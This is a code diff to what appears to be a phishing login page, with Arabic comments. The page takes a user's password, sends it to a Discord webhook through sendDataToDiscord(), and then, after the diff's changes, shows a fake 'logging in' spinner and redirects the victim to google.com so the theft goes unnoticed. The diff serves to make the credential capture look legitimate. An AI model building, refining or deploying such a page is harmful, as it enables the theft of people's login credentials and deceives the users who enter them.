@@ -124,11 +124,23 @@
     #password-page {
         display: none;
     }
-    #success-message {
+    .loading {
         display: none;
-        color: green;
         text-align: center;
         margin-top: 20px;
+    }
+    .loading-spinner {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #0066ff;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
     }
 </style>
 </head>
@@ -176,10 +188,10 @@
         </div>
     </div>
     
-    <!-- رسالة النجاح -->
-    <div id="success-message">
-        <h3>تم تسجيل الدخول بنجاح!</h3>
-        <p>سيتم توجيهك إلى الصفحة الرئيسية قريباً...</p>
+    <!-- رسالة التحميل -->
+    <div id="loading" class="loading">
+        <div class="loading-spinner"></div>
+        <p>جاري تسجيل الدخول...</p>
     </div>
 </div>
 
@@ -241,12 +253,17 @@
         userPassword = password;
         passwordError.style.display = 'none';
         
+        // عرض رسالة التحميل
+        document.getElementById('password-page').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+        
         // إرسال البيانات إلى ويب هوك Discord
         sendDataToDiscord();
         
-        // عرض رسالة النجاح وإخفاء النموذج
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('success-message').style.display = 'block';
+        // توجيه المستخدم إلى الصفحة الرئيسية بعد ثانية واحدة
+        setTimeout(() => {
+            window.location.href = "https://www.google.com"; // يمكنك تغيير هذا الرابط إلى الصفحة الرئيسية المطلوبة
+        }, 1000);
     }
 
     function sendDataToDiscord() {
